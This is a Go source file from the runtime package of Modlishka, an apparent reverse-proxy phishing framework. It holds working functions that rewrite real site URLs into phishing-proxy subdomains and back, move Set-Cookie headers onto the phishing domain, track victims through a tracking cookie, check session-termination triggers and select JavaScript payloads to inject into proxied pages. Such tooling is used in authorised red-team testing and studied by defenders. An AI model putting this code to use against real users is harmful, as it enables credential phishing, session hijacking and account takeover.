package runtime

import (
	"fmt"
	"net/url"
	"regexp"
	"strings"

	"github.com/drk1wi/Modlishka/log"
	"github.com/miekg/dns"
)

//set up regexp upfront

func MakeRegexes() {

	var err error

	regexpStr := MATCH_URL_REGEXP
	RegexpUrl, err = regexp.Compile(regexpStr)
	if err != nil {
		log.Fatalf(err.Error() + "Terminating.")

	}

	regexpStr = `(([a-z0-9.]+)+` + TopLevelDomain + `)`
	RegexpSubdomainWithoutScheme, err = regexp.Compile(regexpStr)
	if err != nil {
		log.Fatalf(err.Error() + "Terminating.")
	}

	regexpStr = `(?:([a-z0-9-]+|\*)\.)?` + ProxyDomain + `\b`
	RegexpPhishSubdomainUrlWithoutScheme, err = regexp.Compile(regexpStr)
	if err != nil {
		log.Fatalf(err.Error() + "Terminating.")
	}

	RegexpCookieTracking, err = regexp.Compile(TrackingCookie + TRACKING_COOKIE_REGEXP)
	if err != nil {
		log.Fatalf(err.Error() + "Terminating.")
	}

	RegexpSubdomain, err = regexp.Compile(IS_SUBDOMAIN_REGEXP)
	if err != nil {
		log.Fatalf(err.Error() + "Terminating.")
	}

	RegexpFindSetCookie, err = regexp.Compile(SET_COOKIE)
	if err != nil {
		log.Fatalf(err.Error() + "Terminating.")
	}

	RegexpSetCookie, err = regexp.Compile(MATCH_URL_REGEXP_WITHOUT_SCHEME)
	if err != nil {
		log.Fatalf(err.Error() + "Terminating.")
	}

}

func TranslateRequestHost(host string) (string, bool, bool) {

	newTarget := Target
	newTls := false
	tlsVal := false
	// first HTTP request client domain hook
	if DynamicMode == true && strings.Contains(host, ProxyDomain) == false {
		return host, newTls, tlsVal
	}

	sub := strings.Replace(host, ProxyDomain, "", -1)
	if sub != "" {
		log.Debugf("Subdomain: %s ", sub[:len(sub)-1])

		decoded, newTls, tlsVal, err := DecodeSubdomain(sub[:len(sub)-1])
		if err == nil {
			if _, ok := dns.IsDomainName(string(decoded)); ok {
				log.Debugf("Subdomain contains encrypted base32  domain: %s ", string(decoded))
				return string(decoded), newTls, tlsVal
			}

		} else { //not hex encoded, treat as normal subdomain
			log.Debugf("Standard subdomain: %s ", sub[:len(sub)-1])
			return sub[:len(sub)-1] + "." + TopLevelDomain, newTls, tlsVal
		}
	}

	return newTarget, newTls, tlsVal
}

func TranslateSetCookie(cookie string) string {
	ret := RegexpSetCookie.ReplaceAllStringFunc(cookie, RealURLtoPhish)

	return ret

}

func RealURLtoPhish(realURL string) string {

	//var domain string
	var host string
	var out string
	var tls bool

	decoded := fmt.Sprintf("%s", realURL)
	u, _ := url.Parse(decoded)
	out = realURL

	if u.Host != "" {
		host = u.Host
	} else {
		host = realURL
	}

	for _, domainToIgnore := range IgnoreTranslateDomains {
		if strings.Contains(host, domainToIgnore) {
			log.Debugf("Ignoring translate for: %s", out)
			return out
		}
	}

	if DisableDynamicSubdomains == true {
		// TODO: DisableDynamicSubdomains doesn't support ForceHTTP and ForceHTTPS yet
		return strings.Replace(out, host, ProxyDomain, 1)
	}

	if u.Scheme == "http" {
		tls = false
	} else if u.Scheme == "https" {
		tls = true
	} else {
		tls = ForceHTTP
	}

	if ForceHTTPS == true || ForceHTTP == true {
		encoded, _ := EncodeSubdomain(host, tls)
		out = strings.Replace(out, host, encoded+"."+ProxyDomain, 1)
	} else {
		if strings.Contains(realURL, TopLevelDomain) { //subdomain in main domain
			out = strings.Replace(out, string(TopLevelDomain), ProxyDomain, 1)
		} else if realURL != "" {
			encoded, _ := EncodeSubdomain(host, tls)
			out = strings.Replace(out, host, encoded+"."+ProxyDomain, 1)
		}
	}

	return out
}

func PhishURLToRealURL(phishURL string) string {

	//var domain string

	var host string
	var out string

	log.Debugf("PhishURLToRealURL: phishURL = %s", phishURL)

	// url parse returns nil when phishURL does not have protocol
	if strings.HasPrefix(phishURL, "https://") == false && strings.HasPrefix(phishURL, "http://") == false {
		u, _ := url.Parse(fmt.Sprintf("https://%s", phishURL))
		host = u.Host
	} else {
		u, _ := url.Parse(phishURL)
		if u.Host != "" {
			host = u.Host
		} else {
			host = phishURL
		}
	}

	log.Debugf("PhishURLToRealURL: host = %s", host)

	out = phishURL

	if strings.Contains(phishURL, ProxyDomain) {
		log.Debugf("PhishURLToRealURL: phishURL contains ProxyDomain '%s'", ProxyDomain)
		subdomain := strings.Replace(host, "."+ProxyDomain, "", 1)

		// has subdomain
		if len(subdomain) > 0 && host != ProxyDomain {
			decodedDomain, _, _, err := DecodeSubdomain(subdomain)
			if err != nil {

				if DisableDynamicSubdomains == true {
					// use target instead of top level
					return strings.Replace(out, ProxyDomain, Target, 1)
				}

				return strings.Replace(out, ProxyDomain, TopLevelDomain, 1)
			}

			return string(decodedDomain)
		}
		if DisableDynamicSubdomains == true {
			// use target instead of top level
			return strings.Replace(out, ProxyDomain, Target, -1)
		}
		return strings.Replace(out, ProxyDomain, TopLevelDomain, -1)
	}

	return out
}

// check if the requested URL matches termination URLS patterns and returns verdict
func CheckTermination(input string) bool {

	input = PhishURLToRealURL(input)

	if len(TerminateTriggers) > 0 {
		for _, pattern := range TerminateTriggers {
			if strings.Contains(input, pattern) {
				return true
			}
		}
	}
	return false
}

func StripProtocol(URL string) string {
	var re = regexp.MustCompile(`^(http|https)://`)
	return re.ReplaceAllString(URL, "")
}

// returns JS payload based on a pattern
func GetJSRulesPayload(input string) string {

	if len(JSInjectStrings) > 0 {

		for key, _ := range JSInjectStrings {
			if strings.Contains(input, key) {
				return JSInjectStrings[key]
			}
		}
	}

	return ""
}
